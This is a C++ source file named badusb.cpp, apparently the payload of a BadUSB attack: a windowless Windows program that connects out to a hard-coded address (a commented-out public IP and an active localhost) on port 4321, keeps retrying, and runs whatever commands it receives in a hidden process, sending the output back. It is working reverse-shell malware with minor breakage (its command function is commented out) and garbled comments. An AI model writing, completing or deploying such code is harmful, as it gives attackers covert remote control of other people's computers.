// badusb.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#pragma comment(lib, "ws2_32.lib")												//����ws2_32.lib
//#include<windows.h>

#pragma comment( linker, "/subsystem:\"windows\" /entry:\"myShell\"" )	// ������ڵ�ַ
#pragma  warning (disable:4996)
#pragma comment(lib,"kernel32.lib")
#pragma comment(linker, "/align:256")
#pragma comment(linker, "/merge:.data=.text")
#pragma comment(linker, "/merge:.rdata=.text")

#define MAXSZ 4096

void reconnect(SOCKET* sock)
{
	*sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(*sock == INVALID_SOCKET) return;											//invalid socket
	//��������
	sockaddr_in sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));										//0���
	sockAddr.sin_family = PF_INET;
	//sockAddr.sin_addr.s_addr = inet_addr("45.76.30.21");
	sockAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	sockAddr.sin_port = htons(4321);
	while(connect(*sock, (SOCKADDR* )&sockAddr, sizeof(SOCKADDR)) == SOCKET_ERROR)
	{
		Sleep(3*1000);
		//retry
	}
}
/*
BOOL PipeCmd(char *pszCmd, char *pszResultBuffer, DWORD dwResultBufferSize)
{
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES securityAttributes = {0};
    BOOL bRet = FALSE;
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    // �趨�ܵ��İ�ȫ����
    securityAttributes.bInheritHandle = TRUE;
    securityAttributes.nLength = sizeof(securityAttributes);
    securityAttributes.lpSecurityDescriptor = NULL;
    // ���������ܵ�
    bRet = CreatePipe(&hReadPipe, &hWritePipe, &securityAttributes, 0);
    if (FALSE == bRet)
    {
        //ShowError("CreatePipe");
        return FALSE;
    }
    // �����½��̲���
    si.cb = sizeof(si);
    si.hStdError = hWritePipe;
    si.hStdOutput = hWritePipe;
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    // �����½���ִ������, ��ִ�н��д�������ܵ���
    bRet = CreateProcess(NULL, pszCmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    if (FALSE == bRet)
    {
        return false;
    }
    // �ȴ�����ִ�н���
    WaitForSingleObject(pi.hThread, INFINITE);
    WaitForSingleObject(pi.hProcess, INFINITE);
    // �������ܵ��ж�ȡ��������������
    RtlZeroMemory(pszResultBuffer, dwResultBufferSize);
    ReadFile(hReadPipe, pszResultBuffer, dwResultBufferSize, NULL, NULL);
    // �رվ��, �ͷ��ڴ�
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hWritePipe);
    CloseHandle(hReadPipe);
    return TRUE;
}
*/

int myShell(int argc, _TCHAR* argv[])
{
	int status;
	//MessageBoxA(NULL,"Hello","Notice",NULL);
	//��ʼ��dll
	WSADATA wsaData;
	if(WSAStartup(MAKEWORD(2,2), &wsaData)!=0) return 1;						//wsastartup error

	//�����׽���
	SOCKET sock;// = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

	reconnect(&sock);

	char szBuffer[MAXSZ] = {0};

	while(1)
	{
		//��������
		status = recv(sock, szBuffer, MAXSZ, NULL);
		if(status > 0)															//��������
		{
			//MessageBoxA(NULL,szBuffer,"Notice",NULL);
			if(strcmp("bye", szBuffer) == 0)
			{
				closesocket(sock);
				reconnect(&sock);
			} else if(strcmp("quit", szBuffer) == 0)
			{
				break;
			} else
			{
				char res[1024*4] = "";
				if(PipeCmd(szBuffer, res, 1024*4))
					send(sock, res, strlen(res), NULL);
				else send(sock, "fail!", strlen("fail!"), NULL);
			}
		} else if(status == 0)													//����
		{
			closesocket(sock);
			reconnect(&sock);													//����
		} else																	//�����쳣, �����Ͽ�����
		{
			closesocket(sock);
			reconnect(&sock);
		}
	}
	closesocket(sock);
	WSACleanup();
	return 0;
}

